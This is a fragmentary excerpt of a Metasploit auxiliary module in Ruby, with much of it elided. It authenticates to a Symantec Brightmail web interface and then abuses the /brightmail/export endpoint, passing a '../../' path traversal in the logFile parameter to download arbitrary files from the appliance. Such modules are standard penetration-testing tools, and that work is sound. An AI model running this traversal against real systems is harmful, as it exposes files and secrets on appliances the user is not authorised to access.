...
class MetasploitModule < Msf::Auxiliary
  ...
  def auth(username, password, sid, last_login)
    ...
    if res && res.headers['Location']
      ...
      res = send_request_cgi('uri' => new_uri,
                             'cookie' => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}")

      return true if res && res.body =~ /Logged in as: #{username}/
    end
  ...
  def download_file(sid, fname)
    res = send_request_cgi('uri' => '/brightmail/export',
                           'cookie'   => "userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}",
                           'vars_get' => {
                             'type' => 'logs',
                             'logFile'     => "../../#{fname}",
  ...
  def run_host(_ip)
    ...
    if !auth(username, password, sid, last_login)
